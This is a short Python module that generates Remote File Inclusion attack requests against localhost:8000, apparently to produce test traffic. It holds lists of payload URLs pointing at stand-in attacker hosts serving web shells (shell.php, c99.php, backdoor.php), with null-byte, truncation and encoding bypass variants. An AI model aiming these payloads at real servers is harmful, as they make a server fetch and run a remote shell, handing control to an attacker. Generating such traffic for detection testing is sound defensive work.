"""
tools/rfi_atk.py — Remote File Inclusion attack payload generator
"""
import random

_HTTP = [
    "http://evil.com/shell.php",
    "http://attacker.com/malware.txt",
    "http://192.168.1.100/backdoor.php",
    "http://evil.example.com/c99.php",
    "http://malicious-host.net/webshell.php?",
]

_HTTPS = [
    "https://evil.com/shell.php",
    "https://attacker.com/payload.txt",
    "https://raw.githubusercontent.com/attacker/shells/main/shell.php",
]

_FTP = [
    "ftp://attacker.com/shell.php",
    "ftp://anonymous:pass@evil.com/shell.txt",
]

_PHP_FILTERS = [
    "http://evil.com/shell.php%00",
    "http://evil.com/shell.php?",
    "http://evil.com/shell.php#",
    "http://evil.com/\\\\shell.php",
]

_ENCODED = [
    "http%3A%2F%2Fevil.com%2Fshell.php",
    "http://evil.com%2fshell.php",
    "http:\\/\\/evil.com\\/shell.php",
]

ALL_PAYLOADS = _HTTP + _HTTPS + _FTP + _PHP_FILTERS + _ENCODED

RFI_PATHS  = ["/load", "/include", "/file", "/module", "/plugin", "/template"]
RFI_PARAMS = ["file", "include", "url", "path", "module", "template", "page"]


def generate() -> tuple[str, str]:
    payload = random.choice(ALL_PAYLOADS)
    path    = random.choice(RFI_PATHS)
    param   = random.choice(RFI_PARAMS)
    url     = f"http://localhost:8000{path}?{param}={payload}"
    return url, payload
